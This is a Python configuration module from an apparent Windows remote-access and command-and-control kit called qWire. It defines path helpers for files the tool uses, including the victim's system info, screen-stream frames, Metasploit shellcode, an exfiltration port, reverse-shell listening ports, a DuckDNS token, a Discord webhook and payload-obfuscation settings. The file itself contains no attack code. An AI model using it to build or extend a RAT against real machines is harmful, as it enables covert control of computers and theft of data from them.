#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
import os

#Needed local logging utilitys function due to circular import error with logging.py
class LoggingUtilitys:

    #Function will return string from cwd + input parameter
    def get_misc_file_path_str(self, file_path_from_working_dir):
        current_dir = os.path.join(os.getcwd())
        target_file_path = str(f'{current_dir}/{file_path_from_working_dir}')
        return target_file_path

    #Function will read a file and return the string data
    def retrieve_file_data(self,file_path):
        with open(file_path,'r') as file:               #Open file
            data = file.read()                          #Read & store data in var
            file.close()                                #Close the file
        return data                                     #Return file contents


#Data storage file paths
class DSFilePath:
    def __init__(self):
        self.sys_info_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/sysinfo.txt')
        self.streaming_frame = LoggingUtilitys().get_misc_file_path_str('data_storage/frame.jpg')
        self.console_output_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/console_output.txt')
        self.active_connections_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/active_connections.txt')
        self.bits_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/bits.txt')
        self.listening_sockets_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/listening.txt')
        self.task_manager_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.txt')
        self.task_manager_csv = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.csv')
        self.job_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/job.txt')
        self.msf_shellcode_file = LoggingUtilitys().get_misc_file_path_str('data_storage/shellcode.txt')

#Config file paths
class CFGFilePath:
    def __init__(self):
        self.server_sockets = LoggingUtilitys().get_misc_file_path_str('configs/networking/ports.txt')
        self.dns_token = LoggingUtilitys().get_misc_file_path_str('configs/tokens/duck_dns_token.txt')
        self.domains_file = LoggingUtilitys().get_misc_file_path_str('configs/networking/domains.txt')
        self.chosen_domain = LoggingUtilitys().get_misc_file_path_str('configs/shells/domain.txt')
        self.current_interface = LoggingUtilitys().get_misc_file_path_str('configs/networking/interface.txt')
        self.exfil_port_file = LoggingUtilitys().get_misc_file_path_str('configs/networking/exfil_port.txt')
        self.shells_lport_file = LoggingUtilitys().get_misc_file_path_str('configs/shells/lport.txt')
        self.stream_port_file = LoggingUtilitys().get_misc_file_path_str('configs/networking/stream_port.txt')
        self.discord_webhook = LoggingUtilitys().get_misc_file_path_str('configs/discord/channel.txt')
        self.discord_setting = LoggingUtilitys().get_misc_file_path_str('configs/discord/setting.txt')
        self.iterations_file = LoggingUtilitys().get_misc_file_path_str('configs/builder/iterations.txt')
        self.var_len_file = LoggingUtilitys().get_misc_file_path_str('configs/builder/variable_length.txt')

#Background filepaths
class BGPath:
    def __init__(self):
        self.qWire_info_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/qWire_info.png')
        self.main_window_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/main_tab_background.jpg')
        self.cheap_loic_lol = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/Listener.jpeg') #Shout out Sven!
        self.settings_window_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/settings_background.jpg')
        self.black_box = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/blackbox.jpeg')
        self.task_man_bg = LoggingUtilitys().get_misc_file_path_str('core/Qt5/img/task_man_bg.jpg')

#Builder related file/dir paths
class BuilderPath:
    def __init__(self):
        self.raw_script_dir = LoggingUtilitys().get_misc_file_path_str('agent/raw')
